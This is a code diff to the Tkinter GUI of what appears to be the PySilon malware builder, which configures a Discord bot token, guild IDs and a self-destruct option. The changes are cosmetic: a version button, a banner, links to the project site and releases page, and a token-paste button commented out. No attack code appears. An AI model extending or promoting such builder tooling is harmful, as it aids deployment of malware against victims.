@@ -93,6 +93,18 @@ class Builder:
         if demand != None: selected_background = demand
         self.image = ImageTk.PhotoImage(Image.open(f'resources/assets/builder_backgrounds/{selected_background}.jpg'))
         self.canvas.create_image(0, 0, image=self.image, anchor=tk.NW)
+        self.canvas.create_text(0, 460, text='Hover on elements to get more info.', fill='white', font=('Consolas', 10), anchor=tk.SW)
+        self.version_indicator = tk.Button(
+            self.canvas,
+            text='v4.0',
+            font=tkFont.Font(family='Consolas', size=10),
+            disabledforeground='white',
+            relief='flat',
+            command=self.open_pysilon_github
+            )
+        self.version_indicator.place(x=700, y=460, anchor=tk.SE)
+
+
 
     def create_navigation(self):
         self.button_frame = tk.Frame(self.master)
@@ -125,30 +137,24 @@ class Builder:
             )
         self.compiling_settings_button.place(x=310, y=0, width=145, height=40)
 
-        self.pysilon_logo = tk.Label(
+        self.banner_image = tk.PhotoImage(file='resources/assets/builder_elements/banner.png')
+        self.banner = tk.Button(
             self.button_frame,
-            text='PySilon',
-            font=tkFont.Font(family='Elephant', size=24)
+            image=self.banner_image,
+            disabledforeground='white',
+            relief='flat',
+            width=15,
+            height=15,
+            command=self.open_pysilon
             )
-        self.pysilon_logo.place(x=549, y=-7)
-
-        self.pysilon_sublogo = tk.Label(
-            self.button_frame,
-            text='M  A  L  W  A  R  E',
-            font=tkFont.Font(family='Elephant', size=5),
-            fg='red'
-            )
-        self.pysilon_sublogo.place(x=590, y=27, width=70)
+        self.banner.place(x=455, y=0, width=245, height=40)
 
         vertical_separator = ttk.Separator(self.button_frame, orient='vertical')
         vertical_separator.place(x=455, y=0, height=40, width=1)
 
         horizontal_separator = ttk.Separator(self.button_frame, orient='horizontal')
         horizontal_separator.place(x=455, y=39, height=1, width=245)
-        
-    def draw_initial_content(self):
-        self.canvas.create_text(200, 150, text='Initial Content', font=('Helvetica', 16), fill='black')
-
+    
     def save_configuration(self, temporary=True):
         try:
             self.configuration['token'] = self.token_entry.get()
@@ -169,6 +175,12 @@ class Builder:
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'r', encoding='utf-8') as configuration_file:
             self.configuration = json.loads(''.join(configuration_file.readlines()))
         
+    def open_pysilon(self):
+        os.system('start https://pysilon.net')
+
+    def open_pysilon_github(self):
+        os.system('start https://github.com/mategol/PySilon-malware/releases')
+
     def general_settings(self):
         self.general_settings_button['state'] = tk.DISABLED
         self.general_settings_button['relief'] = 'flat'
@@ -186,17 +198,17 @@ class Builder:
         self.token_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['token_entry']))
         self.token_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 140, window=self.token_entry, anchor='w')
-        self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
-        self.paste_token_button = tk.Button(
-            self.canvas,
-            image=self.paste_token_icon,
-            disabledforeground='white',
-            relief='flat',
-            width=15,
-            height=15,
-            command=self.paste_token
-            )
-        self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
+        #self.paste_token_icon = tk.PhotoImage(file='resources/assets/builder_elements/paste_icon.png')
+        #self.paste_token_button = tk.Button(
+        #    self.canvas,
+        #    image=self.paste_token_icon,
+        #    disabledforeground='white',
+        #    relief='flat',
+        #    width=15,
+        #    height=15,
+        #    command=self.paste_token
+        #    )
+        #self.canvas.create_window(640, 140, window=self.paste_token_button, anchor='w')
  
         self.canvas.create_text(230, 170, text='Guild IDs:', fill='white', font=('Consolas', 16), anchor=tk.E)
         self.guildids_entry = tk.Entry(self.canvas, font=tkFont.Font(family='Consolas', size=16), width=33)
@@ -233,7 +245,6 @@ class Builder:
         self.implode_entry.bind("<Enter>", lambda event: self.show_tooltip(event, tooltips['implode_entry']))
         self.implode_entry.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(235, 290, window=self.implode_entry, anchor='w')
-
 
     def show_tooltip(self, event, tooltip_text):
         self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=2, background="#0A0A10")
